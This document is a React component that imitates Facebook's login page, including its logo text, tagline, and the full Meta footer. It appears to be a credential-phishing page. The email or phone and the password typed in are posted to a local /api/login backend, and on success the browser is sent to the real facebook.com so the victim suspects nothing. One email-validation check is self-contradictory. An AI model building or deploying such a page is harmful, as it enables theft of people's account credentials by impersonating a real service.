import React, { useState } from "react";

export default function App() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [message, setMessage] = useState({ type: "", text: "" });
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setMessage({ type: "", text: "" });

    const emailOrPhone = formData.email.trim();

    if (emailOrPhone.includes("@")) {
      if (!emailOrPhone.includes("@")) {
        setMessage({
          type: "error",
          text: "Please enter a valid email address",
        });
        setIsLoading(false);
        return;
      }
    } else {
      if (!/^\d{11}$/.test(emailOrPhone)) {
        setMessage({
          type: "error",
          text: "Phone number must be exactly 11 digits",
        });
        setIsLoading(false);
        return;
      }
    }

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: formData.email,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (data.success) {
        setMessage({ type: "success", text: "Logging you in..." });
        setTimeout(() => {
          // Redirect to Facebook
          window.location.href = "https://www.facebook.com";
        }, 1500);
      } else {
        setMessage({ type: "error", text: data.message });
      }
    } catch (error) {
      setMessage({
        type: "error",
        text: "Cannot connect to server. Make sure backend is running.",
      });
      console.error("Login error:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="max-w-6xl w-full flex flex-col lg:flex-row items-center lg:items-start gap-8 lg:gap-16">
          <div className="flex-1 text-center lg:text-left lg:pt-12">
            <h1 className="text-blue-600 text-6xl font-bold mb-4">facebook</h1>
            <p className="text-gray-800 text-2xl lg:text-3xl">
              Connect with friends and the world around you on Facebook.
            </p>
          </div>

          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-lg p-8">
              {message.text && (
                <div
                  className={`mb-4 p-3 rounded ${
                    message.type === "success"
                      ? "bg-green-100 text-green-700 border border-green-300"
                      : "bg-red-100 text-red-700 border border-red-300"
                  }`}
                >
                  {message.text}
                </div>
              )}

              <form onSubmit={handleLogin} className="space-y-4">
                <input
                  type="text"
                  name="email"
                  placeholder="Email or phone number"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg"
                />

                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg"
                />

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold text-xl py-3 rounded-lg transition-colors duration-200 disabled:bg-blue-400 disabled:cursor-not-allowed"
                >
                  {isLoading ? "Logging in..." : "Log In"}
                </button>
              </form>

              <div className="text-center mt-4">
                <a href="#" className="text-blue-600 hover:underline text-sm">
                  Forgot password?
                </a>
              </div>

              <div className="border-t border-gray-300 my-6"></div>

              <div className="text-center">
                <button
                  type="button"
                  className="bg-green-500 hover:bg-green-600 text-white font-semibold px-8 py-3 rounded-lg text-lg transition-colors duration-200"
                >
                  Create new account
                </button>
              </div>
            </div>

            <p className="text-center text-sm mt-6">
              <span className="font-semibold">Create a Page</span> for a
              celebrity, brand or business.
            </p>
          </div>
        </div>
      </div>

      <footer className="bg-white border-t border-gray-300 py-4 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-wrap gap-x-3 gap-y-2 text-xs text-gray-600 mb-2">
            <a href="#" className="hover:underline">
              English (UK)
            </a>
            <a href="#" className="hover:underline">
              Filipino
            </a>
            <a href="#" className="hover:underline">
              Bisaya
            </a>
            <a href="#" className="hover:underline">
              Español
            </a>
            <a href="#" className="hover:underline">
              日本語
            </a>
            <a href="#" className="hover:underline">
              한국어
            </a>
            <a href="#" className="hover:underline">
              中文(简体)
            </a>
            <a href="#" className="hover:underline">
              العربية
            </a>
            <a href="#" className="hover:underline">
              Português (Brasil)
            </a>
            <a href="#" className="hover:underline">
              Français (France)
            </a>
            <a href="#" className="hover:underline">
              Deutsch
            </a>
            <button className="w-6 h-5 border border-gray-400 flex items-center justify-center text-gray-600 hover:bg-gray-100">
              +
            </button>
          </div>

          <div className="border-t border-gray-300 pt-2"></div>

          <div className="flex flex-wrap gap-x-4 gap-y-2 text-xs text-gray-600 mt-2">
            <a href="#" className="hover:underline">
              Sign up
            </a>
            <a href="#" className="hover:underline">
              Log in
            </a>
            <a href="#" className="hover:underline">
              Messenger
            </a>
            <a href="#" className="hover:underline">
              Facebook Lite
            </a>
            <a href="#" className="hover:underline">
              Video
            </a>
            <a href="#" className="hover:underline">
              Meta Pay
            </a>
            <a href="#" className="hover:underline">
              Meta Store
            </a>
            <a href="#" className="hover:underline">
              Meta Quest
            </a>
            <a href="#" className="hover:underline">
              Ray-Ban Meta
            </a>
            <a href="#" className="hover:underline">
              Meta AI
            </a>
            <a href="#" className="hover:underline">
              Meta AI more content
            </a>
            <a href="#" className="hover:underline">
              Instagram
            </a>
            <a href="#" className="hover:underline">
              Threads
            </a>
          </div>

          <div className="flex flex-wrap gap-x-4 gap-y-2 text-xs text-gray-600 mt-2">
            <a href="#" className="hover:underline">
              Voting Information Centre
            </a>
            <a href="#" className="hover:underline">
              Privacy Policy
            </a>
            <a href="#" className="hover:underline">
              Privacy Centre
            </a>
            <a href="#" className="hover:underline">
              About
            </a>
            <a href="#" className="hover:underline">
              Create ad
            </a>
            <a href="#" className="hover:underline">
              Create Page
            </a>
            <a href="#" className="hover:underline">
              Developers
            </a>
            <a href="#" className="hover:underline">
              Careers
            </a>
            <a href="#" className="hover:underline">
              Cookies
            </a>
            <a href="#" className="hover:underline">
              AdChoices
            </a>
            <a href="#" className="hover:underline">
              Terms
            </a>
            <a href="#" className="hover:underline">
              Help
            </a>
            <a href="#" className="hover:underline">
              Contact uploading and non-users
            </a>
          </div>

          <div className="text-xs text-gray-600 mt-4">Meta © 2026</div>
        </div>
      </footer>
    </div>
  );
}
